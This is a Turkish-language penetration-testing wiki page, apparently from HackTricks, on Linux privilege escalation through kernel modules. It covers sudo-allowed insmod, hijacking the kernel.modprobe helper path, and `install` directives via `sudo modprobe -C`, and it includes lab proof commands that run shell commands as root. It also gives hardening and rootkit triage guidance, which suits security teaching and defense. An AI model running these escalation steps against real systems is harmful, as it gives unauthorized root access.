# Kernel Modülleri ve modprobe Kötüye Kullanımı

{{#include ../../banners/hacktricks-training.md}}

## Kernel modülü ve modül yükleme yanlış yapılandırmaları

Kernel modülü desteği, Linux privilege escalation incelemesi sırasında yüksek etkili bir alandır. Her unsigned-module mesajını tek başına exploitable olarak değerlendirmeyin; bunun yerine pratik soruları yanıtlamak için kullanın.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Mevcut kullanıcı `sudo`, capabilities veya yazılabilir bir helper path aracılığıyla modül yükleyebilir mi?
- Modül yükleme hâlâ etkin mi?
- Modül imza zorunluluğu devre dışı mı?
- Modül dizinleri, modül dosyaları veya `modprobe.d` yapılandırma path'leri yazılabilir mi?<sup>[[16]](#references)</sup>
- Ne olduğunu doğrulamak için kernel logları okunabilir mi?

Hızlı ilk inceleme, aşağıdaki modül durumu, imza, loglama ve modül ağacı kontrolleriyle başlar.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Yorum:

- `modules_disabled=1`, modüllerin yüklenemeyeceği veya kaldırılamayacağı ve yeniden başlatılana kadar bu değerin `0` olarak sıfırlanamayacağı anlamına gelir.<sup>[[1]](#references)</sup>
- Kernel komut satırındaki `module.sig_enforce=1` veya `CONFIG_MODULE_SIG_FORCE=y`, modüllerin geçerli imzaya sahip olmasını zorunlu kılar; aksi durumda imzasız modüller yüklenebilir ve kernel taint olabilir.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0`, `dmesg` için herhangi bir kısıtlama uygulanmadığı anlamına gelir; değer `1` olduğunda erişim için `CAP_SYSLOG` gerekir.<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` altındaki yazılabilir yollar tehlikelidir; çünkü `modprobe`, modülleri yüklerken bu ağaçta ve bağımlılık verilerinde arama yapar.<sup>[[8]](#references)</sup>

### Modül yükleme ve kernel çıktısını okuma

Yerel bir modülü yüklemek için yasal izniniz varsa `insmod`, belirttiğiniz `.ko` dosyasının aynısını ekler. Modülün init işlevi yükleme işleminin bir parçası olarak çalışır ve `printk()` ile yazılan mesajlar, normalde `dmesg` ile okunan kernel günlük arabelleğine gider.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Temel bir inceleme iş akışında meta verileri incelemek için `modinfo`, modülü yüklemek ve kaldırmak için `insmod` ve `rmmod`, yüklü durumunu doğrulamak için `lsmod` ve kernel günlüklerini incelemek için `dmesg` kullanılır.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

`sudo -l` çıktısı `insmod`, `modprobe` veya bunları saran bir wrapper için izin veriyorsa bunu kritik kabul edin: `sudo -l`, komutu çalıştıran kullanıcının ayrıcalıklarını listeler ve bir kernel module yüklemek `CAP_SYS_MODULE` gerektirir. Doğrudan capability tabanlı yollar için [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) bölümüne bakın.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### Sudo ile izin verilen `insmod`

Kullanıcının `insmod` çalıştırmasına izin veren bir sudo kuralı, sıradan bir yönetim yardımcısını çalıştırma izniyle kıyaslanamaz. Modülün başlatma kodu ekleme işleminin parçası olarak çalışır; bu nedenle pratikte incelenmesi gereken soru, kullanıcının yüklenecek modülü seçip seçemediği veya değiştirebilip değiştiremediğidir.<sup>[[3]](#references)</sup>

Aşağıdaki genel inceleme akışı, aday bir modül için inceleme, yükleme, durum, günlük ve kaldırma kontrollerini tekrarlar.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Kullanıcı rastgele bir `.ko` dosyası sağlayabiliyorsa, yetkili bir değerlendirmede bu durum tam sistem ihlali olarak değerlendirilmelidir. Daha güvenli bir operasyonel yaklaşım, modül yükleme yetkisini sudo üzerinden devretmekten kaçınmaktır; bu kaçınılmazsa tam yolu, sahipliği, izinleri, imzalama politikasını ve kaldırma iş akışını kısıtlayın.<sup>[[3]](#references)[[10]](#references)</sup>

Kontrollü bir laboratuvarda zararsız bir modül oluşturma yöntemi için aşağıda asgari bir kaynak dosyası ve Makefile gösterilmiştir; `make -C /lib/modules/$(uname -r)/build M=$PWD` biçimi, harici modüller için kernel'in belgelenmiş kbuild iş akışını izler.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Yalnızca yetkili bir laboratuvarda derleyip yükleyin; kbuild harici modülü derler ve yükleme/kaldırma komutları kernel modülü arayüzlerini çağırır.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` kötüye kullanım denetimleri

`kernel.modprobe`, modül otomatik yükleme istekleri için kernel'in çalıştırdığı userspace helper'ı belirtir; bu sysctl, açık modül eklemeyi değil otomatik yüklemeyi etkiler. Bir saldırgan bunu yazılabilir bir executable path'e değiştirebilir ve modül isteği tetikleyebilirse, bu helper ayrıcalıklı kod yürütme yolu hâline gelir. Değerin boş dizge olarak ayarlanması otomatik yükleme isteklerini devre dışı bırakır; `CONFIG_STATIC_USERMODEHELPER=y` ise boş olmayan bir değer, derleme sırasında belirlenen statik helper path'iyle değiştirilir.<sup>[[1]](#references)</sup>

Kernel sysctl arayüzü üzerinden geçerli helper path'ini kontrol edin ve hedefin sahipliğini ve izinlerini inceleyin.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

sysctl ayarlarının, devredilmiş sudo kurallarının veya dosya yeteneklerinin etkilenip etkilenemeyeceğini kontrol edin.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Aşağıdaki yalnızca laboratuvarda kullanılabilecek yöntem, helper path’i değiştirir ve belgelenmiş bir module-autoload isteğini tetikler; bunu yalnızca yalıtılmış ve yetkili bir sistemde kullanın.<sup>[[1]](#references)</sup>

Güncel Linux kernel’larında genel amaçlı bir tetikleyici olarak bilinmeyen bir executable kullanmayın: Eski özel binary-format module autoloading özelliği Linux 6.14’te kaldırıldı; kernel belgelerinde ise bilinmeyen bir filesystem type, module-autoload isteği yolu olarak tanımlanıyor.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Güçlendirilmiş sistemlerde, izinler ayrıcalıksız yazmaları `kernel.modprobe` konumuna engellediğinde, yardımcı dosyanın yolu yazılabilir olmadığında veya modülün otomatik yüklenmesi devre dışı bırakıldığında bu işlem başarısız olmalıdır.<sup>[[1]](#references)</sup>

### Yazılabilir `modprobe.d` yapılandırması ve `sudo modprobe -C`

Bir modülü çözümlemeden önce `modprobe`, öncelik sırasına göre `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` ve `/lib/modprobe.d` gibi yapılandırma dizinlerindeki `.conf` dosyalarını okur. Daha yüksek öncelikli bir dizindeki aynı adlı dosya, daha düşük öncelikli dosyayı gölgeler. Daha da önemlisi, `install <module> <command>` yönergesi, modülü eklemek **yerine** rastgele bir shell komutu çalıştırır. Bu nedenle yazılabilir bir yapılandırma yolu, daha sonra ayrıcalıklı bir `modprobe` çağırıcısının yetkileriyle gecikmeli komut yürütmeye yol açabilir; kernel modül imza zorunluluğu bu userspace komutunun kimliğini doğrulamaz.<sup>[[16]](#references)</sup>

Dizin ve dosya izinlerini denetleyin, ardından etkin yapılandırmayı inceleyin. `modprobe -n -v`, çözümleme incelemesi için güvenlidir; çünkü dry-run modu modülü eklemez ve `install`/`remove` komutlarını çalıştırmaz. Güncel kmod belgeleri kmod 36 sonrasında kaldırılacağını belirttiğinden, eski `--showconfig` yazımı yerine `modprobe -c` kullanın.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe` için kısıtlamasız bir sudo kuralı, rastgele `.ko` dosyaları imza doğrulamasından geçemese bile istismar edilebilir: `-C`, saldırganın kontrolündeki bir yapılandırma dizinini seçer; bu dizinden sudo tarafından başlatılan süreç bir `install` komutu çalıştırabilir.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Azaltma için, sudo üzerinden argüman kısıtlaması olmayan `modprobe` yetkisi vermeyin, tüm yapılandırma dizinlerinin root tarafından sahiplenildiğinden ve yazılamadığından emin olun, beklenmeyen `install`/`remove` direktiflerini inceleyin. Güvenilir bir yönetim iş akışının bir modül için bu direktifleri atlaması gerektiğinde, `modprobe --ignore-install` belirtilen modüle ait direktifleri yok sayar; ancak bağımlılıkların kendi komutları olabilir.<sup>[[8]](#references)[[16]](#references)</sup>

### Yazılabilir `/lib/modules` incelemesi

Yazılabilir modül dizinleri, `modprobe` daha sonra nasıl çağrıldığına bağlı olarak modül değiştirmeye, kötü amaçlı modül yerleştirmeye veya otomatik yükleme istismarına olanak tanıyabilir; `modprobe`, modülleri çözümlerken `/lib/modules/$(uname -r)` konumunu arar ve bağımlılık verilerini kullanır.<sup>[[8]](#references)</sup>

Etkin kernel sürümünün modül ağacındaki yazılabilir modül dosyalarını ve bağımlılık/alias metadata'sını inceleyin.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Yazılabilir modül içeriği bulursanız, `modprobe`'un bağımlılıkları nasıl çözdüğünü ve `modinfo`'nun modül meta verilerini nasıl bildirdiğini inceleyin.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Savunmaya yönelik notlar:

- `/lib/modules` dizininin sahibi `root:root` olmalı ve kullanıcılar tarafından yazılabilir olmamalıdır.<sup>[[8]](#references)</sup>
- Operasyonel olarak mümkün olduğunda, önyüklemeden sonra `kernel.modules_disabled=1` ayarını yapın.<sup>[[1]](#references)</sup>
- Yüklenebilir modüller gerektiren sistemlerde modül imzalamayı zorunlu kılın.<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules` ve `modprobe.d` yapılandırma dizinlerine yapılan yazma işlemlerini ve beklenmeyen `insmod`/`modprobe` çalıştırmalarını izleyin.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Modül tabanlı rootkit triyajı

Kötü amaçlı bir modül; süreçleri ve dosyaları gizlemek, trafiği yönlendirmek veya gizli bilgileri ele geçirmek için syscall'ları, VFS ya da `/proc` görünümlerini, ağ yollarını veya kimlik bilgisi denetimlerini hook'layabilir. Ayrıca `lsmod` tarafından gösterilen modül listesinden kendini kaldırabilir. Kalıcılık; `modprobe.d` takma adları veya install kuralları, `/etc/modules-load.d`, bir systemd birimi, initramfs içeriği ya da meşru bir `.ko` dosyasının değiştirilmesi yoluyla sağlanabilir. Normal bir `lsmod` sonucu yararlı bir kanıttır; ancak kernel düzeyindeki bir ihlal, kernel tarafından sağlanan listeleri güvenilmez hâle getirebilir. Yüklenen modülleri, diskteki dosyaları, önyükleme yapılandırmasını, modül yükleme günlüklerini ve güvenilir harici telemetriyi karşılaştırın.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Beklenmeyen modül adlarını, yolları, bağımlılıkları, imzaları ve yüklenme zamanlarını inceleyin. Kernel taint ve imzasız modül mesajları kanıttan ziyade ipucudur. Bir rootkit'ten şüpheleniliyorsa canlı kernel çıktısına güvenmeden önce güvenilir bir imajdan veya kurtarma ortamından kanıt toplayın. [Kernel vulnerability assessment](kernel-vulnerability-assessment.md) sayfası, tracefs ve sabitlenmiş BPF nesneleri de dahil olmak üzere yapılandırma ve tanılama maruziyetini ele alır.

## References

- [1] [/proc/sys/kernel/ için belgeler — Linux Kernel belgeleri](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel modülü imzalama olanağı — Linux Kernel belgeleri](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Sürücü Temelleri — Linux Kernel belgeleri](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk ile mesaj kaydı — Linux Kernel belgeleri](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Harici Modülleri Derleme — Linux Kernel belgeleri](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] ['execve-v6.14-rc1' etiketini birleştir — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
